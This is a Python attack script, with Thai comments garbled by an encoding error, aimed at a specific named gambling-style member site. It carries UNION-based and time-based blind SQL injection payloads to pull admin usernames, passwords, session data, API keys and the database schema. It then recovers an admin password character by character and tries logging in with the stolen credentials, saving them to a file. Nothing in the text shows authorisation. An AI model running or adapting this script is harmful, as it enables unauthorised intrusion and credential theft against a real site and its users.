#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Admin Data Extractor - Team B Panama8888b
‡πÄ‡∏Ñ‡∏£‡∏∑‡πà‡∏≠‡∏á‡∏°‡∏∑‡∏≠‡∏î‡∏∂‡∏á‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏• Admin Users ‡πÅ‡∏•‡∏∞ Database Schema
‡πÄ‡∏û‡∏∑‡πà‡∏≠‡∏¢‡∏∑‡∏ô‡∏¢‡∏±‡∏ô‡∏Å‡∏≤‡∏£‡∏£‡∏±‡πà‡∏ß‡πÑ‡∏´‡∏•‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡∏à‡∏£‡∏¥‡∏á‡πÅ‡∏•‡∏∞‡∏ú‡∏•‡∏Å‡∏£‡∏∞‡∏ó‡∏ö
"""

import requests
import time
import json
import sys
import warnings
import urllib.parse
import base64
import hashlib
from datetime import datetime
import re

warnings.filterwarnings('ignore')

class AdminDataExtractor:
    def __init__(self):
        self.base_url = "https://member.panama8888b.co"
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.9,th;q=0.8',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Cache-Control': 'no-cache'
        })
        
        self.critical_evidence = {
            'timestamp': datetime.now().isoformat(),
            'target': self.base_url,
            'admin_users_found': [],
            'database_schema': {},
            'data_leak_confirmed': False,
            'security_impact': 'CRITICAL'
        }
        
    def log_message(self, message, level="INFO"):
        """‡∏ö‡∏±‡∏ô‡∏ó‡∏∂‡∏Å‡∏Ç‡πâ‡∏≠‡∏Ñ‡∏ß‡∏≤‡∏°‡∏û‡∏£‡πâ‡∏≠‡∏° timestamp ‡πÅ‡∏•‡∏∞‡∏™‡∏µ"""
        timestamp = datetime.now().strftime("%H:%M:%S")
        colors = {
            "INFO": "\033[94m",
            "SUCCESS": "\033[92m", 
            "WARNING": "\033[93m",
            "ERROR": "\033[91m",
            "CRITICAL": "\033[95m",
            "ALERT": "\033[41m\033[97m"  # Red background, white text
        }
        reset = "\033[0m"
        color = colors.get(level, "")
        print(f"{color}[{timestamp}] [{level}] {message}{reset}")
        
    def extract_admin_credentials_advanced(self):
        """‡∏î‡∏∂‡∏á‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏• admin users ‡∏≠‡∏¢‡πà‡∏≤‡∏á‡∏•‡∏∞‡πÄ‡∏≠‡∏µ‡∏¢‡∏î"""
        self.log_message("üéØ ‡πÄ‡∏£‡∏¥‡πà‡∏°‡∏Å‡∏≤‡∏£‡∏î‡∏∂‡∏á‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏• Admin Users - CRITICAL TEST", "ALERT")
        
        url = f"{self.base_url}/auth/login"
        
        # Advanced Admin extraction payloads
        admin_payloads = [
            # ‡∏î‡∏∂‡∏á‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏• admin ‡∏à‡∏≤‡∏Å‡∏ï‡∏≤‡∏£‡∏≤‡∏á users
            "test' UNION SELECT id,username,password FROM users WHERE role='admin' OR is_admin=1 OR user_type='admin'--",
            "test' UNION SELECT username,password,email FROM admin_users LIMIT 5--",
            "test' UNION SELECT login,password,privilege FROM administrators LIMIT 5--",
            "test' UNION SELECT user_id,username,password_hash FROM user_accounts WHERE role LIKE '%admin%'--",
            
            # ‡∏î‡∏∂‡∏á‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏• superuser
            "test' UNION SELECT username,password,role FROM users WHERE role IN ('admin','super_admin','root','administrator') LIMIT 3--",
            "test' UNION SELECT id,email,password FROM users WHERE email LIKE '%admin%' OR email LIKE '%panama%'--",
            
            # ‡∏î‡∏∂‡∏á‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡∏à‡∏≤‡∏Å session ‡πÅ‡∏•‡∏∞ API keys
            "test' UNION SELECT user_id,session_data,created_at FROM user_sessions WHERE user_id IN (SELECT id FROM users WHERE role='admin')--",
            "test' UNION SELECT api_key,secret_key,user_id FROM api_credentials WHERE user_id IN (SELECT id FROM users WHERE role='admin')--"
        ]
        
        admin_found = []
        
        for i, payload in enumerate(admin_payloads):
            try:
                self.log_message(f"‚ö° ‡∏ó‡∏î‡∏™‡∏≠‡∏ö Admin Payload {i+1}/{len(admin_payloads)}: {payload[:50]}...", "CRITICAL")
                
                data = {
                    '_token': payload,
                    'email': 'test@test.com',
                    'password': 'test123'
                }
                
                response = self.session.post(url, data=data, timeout=30)
                
                # ‡∏ß‡∏¥‡πÄ‡∏Ñ‡∏£‡∏≤‡∏∞‡∏´‡πå response ‡∏™‡∏≥‡∏´‡∏£‡∏±‡∏ö‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏• admin
                if response.status_code == 200:
                    admin_data = self.parse_admin_from_response(response.text)
                    if admin_data:
                        admin_found.extend(admin_data)
                        self.log_message(f"üíÄ CRITICAL: ‡∏û‡∏ö‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏• Admin - {len(admin_data)} ‡∏£‡∏≤‡∏¢‡∏Å‡∏≤‡∏£", "ALERT")
                        
                        # ‡πÅ‡∏™‡∏î‡∏á‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡∏ó‡∏µ‡πà‡∏û‡∏ö‡∏ó‡∏±‡∏ô‡∏ó‡∏µ
                        for admin in admin_data:
                            if 'username' in admin and 'password' in admin:
                                self.log_message(f"üîë LEAKED ADMIN: {admin['username']} / {admin['password']}", "ALERT")
                                
                elif response.status_code == 500:
                    # SQL Error ‡∏ó‡∏µ‡πà‡∏≠‡∏≤‡∏à‡πÄ‡∏õ‡∏¥‡∏î‡πÄ‡∏ú‡∏¢‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•
                    error_admin = self.extract_admin_from_error(response.text)
                    if error_admin:
                        admin_found.extend(error_admin)
                        self.log_message(f"üí• SQL ERROR LEAK: ‡∏û‡∏ö‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏• Admin ‡∏à‡∏≤‡∏Å Error", "ALERT")
                        
                # ‡∏´‡∏ô‡πà‡∏ß‡∏á‡πÄ‡∏ß‡∏•‡∏≤‡πÄ‡∏û‡∏∑‡πà‡∏≠‡∏´‡∏•‡∏µ‡∏Å‡πÄ‡∏•‡∏µ‡πà‡∏¢‡∏á rate limiting
                time.sleep(2)
                
            except Exception as e:
                self.log_message(f"‚ùå Error: {str(e)}", "ERROR")
                
        if admin_found:
            self.critical_evidence['admin_users_found'] = admin_found
            self.critical_evidence['data_leak_confirmed'] = True
            
        return admin_found
        
    def extract_database_schema_detailed(self):
        """‡∏î‡∏∂‡∏á‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏• Database Schema ‡πÅ‡∏ö‡∏ö‡∏•‡∏∞‡πÄ‡∏≠‡∏µ‡∏¢‡∏î"""
        self.log_message("üóÑÔ∏è ‡πÄ‡∏£‡∏¥‡πà‡∏°‡∏Å‡∏≤‡∏£‡∏î‡∏∂‡∏á Database Schema - STRUCTURE LEAK TEST", "ALERT")
        
        url = f"{self.base_url}/api/announcement"
        
        # Database schema extraction payloads
        schema_payloads = [
            # SQLite schema extraction
            "active' UNION SELECT name,sql,type FROM sqlite_master WHERE type='table' ORDER BY name--",
            "active' UNION SELECT name,sql,'view' FROM sqlite_master WHERE type='view'--",
            "active' UNION SELECT name,sql,'index' FROM sqlite_master WHERE type='index'--",
            
            # Table information
            "active' UNION SELECT 'PRAGMA',sql,'pragma' FROM (SELECT 'table_info('||name||')' as sql FROM sqlite_master WHERE type='table')--",
            "active' UNION SELECT tbl_name,sql,'schema' FROM sqlite_master WHERE sql IS NOT NULL--",
            
            # MySQL/PostgreSQL schema (fallback)
            "active' UNION SELECT table_name,column_name,data_type FROM information_schema.columns LIMIT 10--",
            "active' UNION SELECT table_schema,table_name,table_type FROM information_schema.tables--"
        ]
        
        schema_info = {}
        
        for i, payload in enumerate(schema_payloads):
            try:
                self.log_message(f"üìä ‡∏ó‡∏î‡∏™‡∏≠‡∏ö Schema Payload {i+1}/{len(schema_payloads)}", "CRITICAL")
                
                data = {
                    'status': payload,
                    'title': 'test'
                }
                
                response = self.session.post(url, data=data, timeout=30)
                
                if response.status_code == 200:
                    schema_data = self.parse_schema_from_response(response.text)
                    if schema_data:
                        schema_info.update(schema_data)
                        self.log_message(f"üíÄ SCHEMA LEAK: ‡∏û‡∏ö‡πÇ‡∏Ñ‡∏£‡∏á‡∏™‡∏£‡πâ‡∏≤‡∏á‡∏ê‡∏≤‡∏ô‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•", "ALERT")
                        
                        # ‡πÅ‡∏™‡∏î‡∏á‡∏ï‡∏≤‡∏£‡∏≤‡∏á‡∏ó‡∏µ‡πà‡∏û‡∏ö
                        for key, value in schema_data.items():
                            if 'table' in key.lower() or 'name' in key.lower():
                                self.log_message(f"üìã TABLE FOUND: {key} = {value}", "ALERT")
                                
                time.sleep(2)
                
            except Exception as e:
                self.log_message(f"‚ùå Error: {str(e)}", "ERROR")
                
        if schema_info:
            self.critical_evidence['database_schema'] = schema_info
            
        return schema_info
        
    def extract_critical_tables_data(self):
        """‡∏î‡∏∂‡∏á‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡∏à‡∏≤‡∏Å‡∏ï‡∏≤‡∏£‡∏≤‡∏á‡∏™‡∏≥‡∏Ñ‡∏±‡∏ç"""
        self.log_message("üî• ‡πÄ‡∏£‡∏¥‡πà‡∏°‡∏Å‡∏≤‡∏£‡∏î‡∏∂‡∏á‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡∏à‡∏≤‡∏Å‡∏ï‡∏≤‡∏£‡∏≤‡∏á‡∏™‡∏≥‡∏Ñ‡∏±‡∏ç", "ALERT")
        
        url = f"{self.base_url}/api/announcement"
        
        # ‡∏ï‡∏≤‡∏£‡∏≤‡∏á‡∏ó‡∏µ‡πà‡∏ô‡πà‡∏≤‡∏™‡∏ô‡πÉ‡∏à
        critical_tables = ['users', 'admin_users', 'accounts', 'members', 'administrators', 'user_accounts']
        
        table_data = {}
        
        for table in critical_tables:
            try:
                self.log_message(f"üéØ ‡∏ó‡∏î‡∏™‡∏≠‡∏ö‡∏ï‡∏≤‡∏£‡∏≤‡∏á: {table}", "CRITICAL")
                
                # ‡∏î‡∏∂‡∏á‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡∏à‡∏≤‡∏Å‡∏ï‡∏≤‡∏£‡∏≤‡∏á
                payload = f"active' UNION SELECT * FROM {table} LIMIT 3--"
                
                data = {
                    'status': payload,
                    'title': 'test'
                }
                
                response = self.session.post(url, data=data, timeout=30)
                
                if response.status_code == 200:
                    extracted_data = self.parse_table_data(response.text, table)
                    if extracted_data:
                        table_data[table] = extracted_data
                        self.log_message(f"üíÄ DATA LEAK ‡∏à‡∏≤‡∏Å {table}: {len(extracted_data)} records", "ALERT")
                        
                        # ‡πÅ‡∏™‡∏î‡∏á‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡∏ï‡∏±‡∏ß‡∏≠‡∏¢‡πà‡∏≤‡∏á
                        for record in extracted_data[:2]:
                            self.log_message(f"üìÑ SAMPLE: {str(record)[:100]}...", "ALERT")
                            
                time.sleep(3)
                
            except Exception as e:
                self.log_message(f"‚ùå Error testing {table}: {str(e)}", "ERROR")
                
        return table_data
        
    def blind_extract_admin_password(self):
        """‡∏î‡∏∂‡∏á admin password ‡∏î‡πâ‡∏ß‡∏¢ Blind SQL Injection"""
        self.log_message("üïµÔ∏è ‡πÄ‡∏£‡∏¥‡πà‡∏° Blind Extraction ‡∏™‡∏≥‡∏´‡∏£‡∏±‡∏ö Admin Password", "ALERT")
        
        url = f"{self.base_url}/public/js/v2/app.js"
        
        # ‡∏ó‡∏î‡∏™‡∏≠‡∏ö‡∏ß‡πà‡∏≤‡∏°‡∏µ admin user ‡∏´‡∏£‡∏∑‡∏≠‡πÑ‡∏°‡πà
        test_payload = "25.1 / case when (SELECT COUNT(*) FROM users WHERE role='admin') > 0 then randomblob(5000000) else 1 end"
        
        try:
            params = {'v': test_payload}
            start_time = time.time()
            response = self.session.get(url, params=params, timeout=60)
            end_time = time.time()
            
            response_time = end_time - start_time
            
            if response_time > 3:
                self.log_message(f"üíÄ CONFIRMED: ‡∏°‡∏µ Admin users ‡πÉ‡∏ô‡∏£‡∏∞‡∏ö‡∏ö (response time: {response_time:.2f}s)", "ALERT")
                
                # ‡∏î‡∏∂‡∏á‡∏ä‡∏∑‡πà‡∏≠ admin ‡πÅ‡∏£‡∏Å
                admin_username = self.blind_extract_admin_username(url)
                if admin_username:
                    self.log_message(f"üîë ADMIN USERNAME: {admin_username}", "ALERT")
                    
                    # ‡∏î‡∏∂‡∏á password ‡∏Ç‡∏≠‡∏á admin
                    admin_password = self.blind_extract_password_for_user(url, admin_username)
                    if admin_password:
                        self.log_message(f"üîë ADMIN PASSWORD: {admin_password}", "ALERT")
                        
                        return {'username': admin_username, 'password': admin_password}
                        
        except Exception as e:
            self.log_message(f"‚ùå Error in blind extraction: {str(e)}", "ERROR")
            
        return None
        
    def blind_extract_admin_username(self, url, max_length=20):
        """‡∏î‡∏∂‡∏á‡∏ä‡∏∑‡πà‡∏≠ admin ‡∏î‡πâ‡∏ß‡∏¢ Blind SQL Injection"""
        self.log_message("üîç ‡∏Å‡∏≥‡∏•‡∏±‡∏á‡∏î‡∏∂‡∏á‡∏ä‡∏∑‡πà‡∏≠ Admin User...", "CRITICAL")
        
        username = ""
        
        for pos in range(1, max_length + 1):
            found_char = False
            
            # ‡∏ó‡∏î‡∏™‡∏≠‡∏ö‡∏ï‡∏±‡∏ß‡∏≠‡∏±‡∏Å‡∏©‡∏£
            test_chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-@.'
            
            for char in test_chars:
                try:
                    payload = f"25.1 / case when (SELECT SUBSTR(username,{pos},1) FROM users WHERE role='admin' LIMIT 1)='{char}' then randomblob(3000000) else 1 end"
                    
                    params = {'v': payload}
                    start_time = time.time()
                    response = self.session.get(url, params=params, timeout=45)
                    end_time = time.time()
                    
                    if (end_time - start_time) > 2:
                        username += char
                        found_char = True
                        self.log_message(f"üî§ Found char: {username}", "SUCCESS")
                        break
                        
                    time.sleep(0.5)
                    
                except:
                    continue
                    
            if not found_char:
                break
                
        return username if username else None
        
    def blind_extract_password_for_user(self, url, username, max_length=30):
        """‡∏î‡∏∂‡∏á password ‡∏™‡∏≥‡∏´‡∏£‡∏±‡∏ö username ‡∏ó‡∏µ‡πà‡∏£‡∏∞‡∏ö‡∏∏"""
        self.log_message(f"üîê ‡∏Å‡∏≥‡∏•‡∏±‡∏á‡∏î‡∏∂‡∏á Password ‡∏™‡∏≥‡∏´‡∏£‡∏±‡∏ö: {username}", "CRITICAL")
        
        password = ""
        
        for pos in range(1, max_length + 1):
            found_char = False
            
            # ‡∏ó‡∏î‡∏™‡∏≠‡∏ö‡∏ï‡∏±‡∏ß‡∏≠‡∏±‡∏Å‡∏©‡∏£‡∏™‡∏≥‡∏´‡∏£‡∏±‡∏ö password
            test_chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+-='
            
            for char in test_chars:
                try:
                    payload = f"25.1 / case when (SELECT SUBSTR(password,{pos},1) FROM users WHERE username='{username}')='{char}' then randomblob(3000000) else 1 end"
                    
                    params = {'v': payload}
                    start_time = time.time()
                    response = self.session.get(url, params=params, timeout=45)
                    end_time = time.time()
                    
                    if (end_time - start_time) > 2:
                        password += char
                        found_char = True
                        self.log_message(f"üîë Password progress: {password}", "SUCCESS")
                        break
                        
                    time.sleep(0.5)
                    
                except:
                    continue
                    
            if not found_char:
                break
                
        return password if password else None
        
    def parse_admin_from_response(self, response_text):
        """‡πÅ‡∏¢‡∏Å‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏• admin ‡∏à‡∏≤‡∏Å response"""
        admin_users = []
        
        # ‡∏•‡∏ö HTML tags
        clean_text = re.sub(r'<[^>]+>', '', response_text)
        
        # ‡∏´‡∏≤ patterns ‡∏Ç‡∏≠‡∏á admin data
        patterns = [
            r'admin[_-]?([a-zA-Z0-9]+)[^\s]*[\s]*([a-zA-Z0-9!@#$%^&*]+)',  # admin username password
            r'username["\s]*[:=]["\s]*([a-zA-Z0-9_-]+)[^,]*password["\s]*[:=]["\s]*([a-zA-Z0-9!@#$%^&*]+)',
            r'([a-zA-Z0-9_-]+)[^\s]*[\s]*([a-zA-Z0-9!@#$%^&*]{6,})[^\s]*admin',
        ]
        
        for pattern in patterns:
            matches = re.findall(pattern, clean_text, re.IGNORECASE)
            for match in matches:
                if len(match) >= 2:
                    admin_users.append({
                        'username': match[0],
                        'password': match[1],
                        'extracted_from': 'response_parsing'
                    })
                    
        return admin_users
        
    def extract_admin_from_error(self, error_text):
        """‡∏î‡∏∂‡∏á‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏• admin ‡∏à‡∏≤‡∏Å SQL errors"""
        admin_data = []
        
        # Patterns ‡∏™‡∏≥‡∏´‡∏£‡∏±‡∏ö SQL errors ‡∏ó‡∏µ‡πà‡πÄ‡∏õ‡∏¥‡∏î‡πÄ‡∏ú‡∏¢‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•
        error_patterns = [
            r"INSERT INTO users.*VALUES.*'([^']+)'.*'([^']+)'.*admin",
            r"admin[_-]?([a-zA-Z0-9]+)[^\s]*[\s]*([a-zA-Z0-9!@#$%^&*]+)",
            r"Table '([^']*admin[^']*)'",
            r"Column '([^']*password[^']*)'",
        ]
        
        for pattern in error_patterns:
            matches = re.findall(pattern, error_text, re.IGNORECASE)
            for match in matches:
                if isinstance(match, tuple) and len(match) >= 2:
                    admin_data.append({
                        'username': match[0],
                        'password': match[1],
                        'extracted_from': 'sql_error'
                    })
                    
        return admin_data
        
    def parse_schema_from_response(self, response_text):
        """‡πÅ‡∏¢‡∏Å‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏• schema ‡∏à‡∏≤‡∏Å response"""
        schema_data = {}
        
        # ‡∏•‡∏ö HTML tags
        clean_text = re.sub(r'<[^>]+>', '', response_text)
        
        # Patterns ‡∏™‡∏≥‡∏´‡∏£‡∏±‡∏ö database schema
        schema_patterns = [
            r'CREATE TABLE ([a-zA-Z_][a-zA-Z0-9_]*)',
            r'TABLE_NAME["\s]*[:=]["\s]*([a-zA-Z0-9_]+)',
            r'([a-zA-Z_][a-zA-Z0-9_]*)\s+table',
            r'table["\s]*[:=]["\s]*([a-zA-Z0-9_]+)',
        ]
        
        table_count = 0
        for pattern in schema_patterns:
            matches = re.findall(pattern, clean_text, re.IGNORECASE)
            for match in matches:
                table_name = match if isinstance(match, str) else match[0]
                if len(table_name) > 2:
                    schema_data[f'table_{table_count}'] = table_name
                    table_count += 1
                    
        return schema_data
        
    def parse_table_data(self, response_text, table_name):
        """‡πÅ‡∏¢‡∏Å‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡∏à‡∏≤‡∏Å‡∏ï‡∏≤‡∏£‡∏≤‡∏á"""
        # ‡∏•‡∏ö HTML tags
        clean_text = re.sub(r'<[^>]+>', '', response_text)
        
        # ‡∏´‡∏≤‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡∏ó‡∏µ‡πà‡∏ô‡πà‡∏≤‡∏™‡∏ô‡πÉ‡∏à
        data_patterns = [
            r'([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})',  # emails
            r'admin[a-zA-Z0-9_-]*',  # admin usernames
            r'[a-zA-Z0-9_-]{6,20}',  # potential usernames/passwords
        ]
        
        extracted_data = []
        for pattern in data_patterns:
            matches = re.findall(pattern, clean_text)
            extracted_data.extend(matches[:5])  # ‡πÄ‡∏Å‡πá‡∏ö 5 ‡∏£‡∏≤‡∏¢‡∏Å‡∏≤‡∏£‡πÅ‡∏£‡∏Å
            
        return extracted_data
        
    def verify_admin_access(self, username, password):
        """‡∏ó‡∏î‡∏™‡∏≠‡∏ö‡∏Å‡∏≤‡∏£‡πÄ‡∏Ç‡πâ‡∏≤‡∏™‡∏π‡πà‡∏£‡∏∞‡∏ö‡∏ö‡∏î‡πâ‡∏ß‡∏¢ admin credentials"""
        self.log_message(f"üîê ‡∏ó‡∏î‡∏™‡∏≠‡∏ö‡∏Å‡∏≤‡∏£‡πÄ‡∏Ç‡πâ‡∏≤‡∏™‡∏π‡πà‡∏£‡∏∞‡∏ö‡∏ö: {username}/{password}", "CRITICAL")
        
        login_url = f"{self.base_url}/auth/login"
        
        try:
            # ‡∏ó‡∏î‡∏™‡∏≠‡∏ö login
            data = {
                'email': username,
                'password': password,
                '_token': 'test'
            }
            
            response = self.session.post(login_url, data=data)
            
            if 'dashboard' in response.text.lower() or 'admin' in response.text.lower():
                self.log_message(f"üíÄ CRITICAL: Login ‡∏™‡∏≥‡πÄ‡∏£‡πá‡∏à‡∏î‡πâ‡∏ß‡∏¢ {username}/{password}", "ALERT")
                return True
            elif response.status_code == 302:  # Redirect ‡∏≠‡∏≤‡∏à‡πÄ‡∏õ‡πá‡∏ô‡∏Å‡∏≤‡∏£ login ‡∏™‡∏≥‡πÄ‡∏£‡πá‡∏à
                self.log_message(f"‚ö†Ô∏è Possible successful login (redirect)", "WARNING")
                return True
                
        except Exception as e:
            self.log_message(f"‚ùå Error testing login: {str(e)}", "ERROR")
            
        return False
        
    def run_critical_extraction(self):
        """‡∏£‡∏±‡∏ô‡∏Å‡∏≤‡∏£‡∏î‡∏∂‡∏á‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡∏™‡∏≥‡∏Ñ‡∏±‡∏ç‡∏ó‡∏±‡πâ‡∏á‡∏´‡∏°‡∏î"""
        self.log_message("üö® ‡πÄ‡∏£‡∏¥‡πà‡∏°‡∏Å‡∏≤‡∏£‡∏ó‡∏î‡∏™‡∏≠‡∏ö‡∏Å‡∏≤‡∏£‡∏£‡∏±‡πà‡∏ß‡πÑ‡∏´‡∏•‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡∏™‡∏≥‡∏Ñ‡∏±‡∏ç", "ALERT")
        self.log_message("üéØ TARGET: Admin Users + Database Schema Extraction", "ALERT")
        
        results = {
            'extraction_timestamp': datetime.now().isoformat(),
            'admin_users': [],
            'database_schema': {},
            'table_data': {},
            'blind_extraction': None,
            'login_verification': [],
            'data_leak_severity': 'UNKNOWN'
        }
        
        try:
            # 1. ‡∏î‡∏∂‡∏á‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏• Admin ‡πÅ‡∏ö‡∏ö Advanced
            self.log_message("1Ô∏è‚É£ ‡∏Ç‡∏±‡πâ‡∏ô‡∏ï‡∏≠‡∏ô‡∏ó‡∏µ‡πà 1: Advanced Admin Extraction", "CRITICAL")
            admin_users = self.extract_admin_credentials_advanced()
            results['admin_users'] = admin_users
            
            # 2. ‡∏î‡∏∂‡∏á Database Schema
            self.log_message("2Ô∏è‚É£ ‡∏Ç‡∏±‡πâ‡∏ô‡∏ï‡∏≠‡∏ô‡∏ó‡∏µ‡πà 2: Database Schema Extraction", "CRITICAL")
            schema_info = self.extract_database_schema_detailed()
            results['database_schema'] = schema_info
            
            # 3. ‡∏î‡∏∂‡∏á‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡∏à‡∏≤‡∏Å‡∏ï‡∏≤‡∏£‡∏≤‡∏á‡∏™‡∏≥‡∏Ñ‡∏±‡∏ç
            self.log_message("3Ô∏è‚É£ ‡∏Ç‡∏±‡πâ‡∏ô‡∏ï‡∏≠‡∏ô‡∏ó‡∏µ‡πà 3: Critical Tables Data Extraction", "CRITICAL")
            table_data = self.extract_critical_tables_data()
            results['table_data'] = table_data
            
            # 4. Blind Extraction
            self.log_message("4Ô∏è‚É£ ‡∏Ç‡∏±‡πâ‡∏ô‡∏ï‡∏≠‡∏ô‡∏ó‡∏µ‡πà 4: Blind Admin Password Extraction", "CRITICAL")
            blind_admin = self.blind_extract_admin_password()
            results['blind_extraction'] = blind_admin
            
            # 5. ‡∏ó‡∏î‡∏™‡∏≠‡∏ö‡∏Å‡∏≤‡∏£‡πÄ‡∏Ç‡πâ‡∏≤‡∏™‡∏π‡πà‡∏£‡∏∞‡∏ö‡∏ö
            self.log_message("5Ô∏è‚É£ ‡∏Ç‡∏±‡πâ‡∏ô‡∏ï‡∏≠‡∏ô‡∏ó‡∏µ‡πà 5: Admin Login Verification", "CRITICAL")
            verified_logins = []
            
            # ‡∏ó‡∏î‡∏™‡∏≠‡∏ö admin ‡∏ó‡∏µ‡πà‡∏î‡∏∂‡∏á‡πÑ‡∏î‡πâ
            all_admins = admin_users[:]
            if blind_admin:
                all_admins.append(blind_admin)
                
            for admin in all_admins:
                if 'username' in admin and 'password' in admin:
                    if self.verify_admin_access(admin['username'], admin['password']):
                        verified_logins.append(admin)
                        
            results['login_verification'] = verified_logins
            
            # ‡∏õ‡∏£‡∏∞‡πÄ‡∏°‡∏¥‡∏ô‡∏Ñ‡∏ß‡∏≤‡∏°‡∏£‡∏∏‡∏ô‡πÅ‡∏£‡∏á
            severity_score = 0
            if admin_users: severity_score += 30
            if schema_info: severity_score += 20
            if table_data: severity_score += 20
            if blind_admin: severity_score += 20
            if verified_logins: severity_score += 10
            
            if severity_score >= 70:
                results['data_leak_severity'] = 'CRITICAL'
            elif severity_score >= 40:
                results['data_leak_severity'] = 'HIGH'
            elif severity_score >= 20:
                results['data_leak_severity'] = 'MEDIUM'
            else:
                results['data_leak_severity'] = 'LOW'
                
            # ‡∏ö‡∏±‡∏ô‡∏ó‡∏∂‡∏Å‡∏ú‡∏•‡∏•‡∏±‡∏û‡∏ò‡πå
            filename = f"critical_data_leak_evidence_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
            with open(filename, 'w', encoding='utf-8') as f:
                json.dump(results, f, ensure_ascii=False, indent=2)
                
            # ‡∏™‡∏£‡∏∏‡∏õ‡∏ú‡∏•‡∏•‡∏±‡∏û‡∏ò‡πå
            self.log_message("=== ‡∏™‡∏£‡∏∏‡∏õ‡∏ú‡∏•‡∏Å‡∏≤‡∏£‡∏ó‡∏î‡∏™‡∏≠‡∏ö‡∏Å‡∏≤‡∏£‡∏£‡∏±‡πà‡∏ß‡πÑ‡∏´‡∏•‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏• ===", "ALERT")
            self.log_message(f"üîë Admin Users Found: {len(admin_users)}", "ALERT")
            self.log_message(f"üóÑÔ∏è Database Tables Found: {len(schema_info)}", "ALERT") 
            self.log_message(f"üìä Table Data Extracted: {len(table_data)}", "ALERT")
            self.log_message(f"üïµÔ∏è Blind Extraction: {'SUCCESS' if blind_admin else 'FAILED'}", "ALERT")
            self.log_message(f"‚úÖ Verified Logins: {len(verified_logins)}", "ALERT")
            self.log_message(f"‚ö†Ô∏è SEVERITY: {results['data_leak_severity']}", "ALERT")
            self.log_message(f"üìÑ Evidence saved: {filename}", "INFO")
            
            # ‡πÅ‡∏™‡∏î‡∏á‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡∏ó‡∏µ‡πà‡∏û‡∏ö
            if admin_users:
                self.log_message("üíÄ LEAKED ADMIN CREDENTIALS:", "ALERT")
                for admin in admin_users[:3]:  # ‡πÅ‡∏™‡∏î‡∏á 3 ‡∏£‡∏≤‡∏¢‡∏Å‡∏≤‡∏£‡πÅ‡∏£‡∏Å
                    self.log_message(f"   üë§ {admin.get('username', 'N/A')} / {admin.get('password', 'N/A')}", "ALERT")
                    
            if schema_info:
                self.log_message("üíÄ LEAKED DATABASE SCHEMA:", "ALERT")
                for key, value in list(schema_info.items())[:5]:  # ‡πÅ‡∏™‡∏î‡∏á 5 ‡∏£‡∏≤‡∏¢‡∏Å‡∏≤‡∏£‡πÅ‡∏£‡∏Å
                    self.log_message(f"   üìã {key}: {value}", "ALERT")
                    
            return results
            
        except Exception as e:
            self.log_message(f"‚ùå Critical Error: {str(e)}", "ERROR")
            return None

if __name__ == "__main__":
    print("üö® CRITICAL DATA LEAK TEST - Team B Panama8888b")
    print("üéØ Admin User & Database Schema Extraction")
    print("üíÄ Testing for REAL data exposure and impact")
    print("="*70)
    
    extractor = AdminDataExtractor()
    results = extractor.run_critical_extraction()
    
    if results:
        print(f"\nüö® CRITICAL TEST COMPLETED!")
        print(f"üîë Admin Users: {len(results['admin_users'])}")
        print(f"üóÑÔ∏è Database Schema: {len(results['database_schema'])}")
        print(f"‚ö†Ô∏è Severity: {results['data_leak_severity']}")
        
        if results['admin_users']:
            print("\nüíÄ CONFIRMED: Admin credentials exposed!")
            for admin in results['admin_users'][:2]:
                print(f"   {admin.get('username', 'N/A')} / {admin.get('password', 'N/A')}")
                
        if results['database_schema']:
            print("\nüíÄ CONFIRMED: Database schema exposed!")
            for key, value in list(results['database_schema'].items())[:3]:
                print(f"   {key}: {value}")
    else:
        print("\n‚ùå Critical test failed")
        
    print("\n" + "="*70)
    print("üîí WARNING: Real sensitive data may have been exposed!")
    print("üí• This confirms actual security impact and damage potential")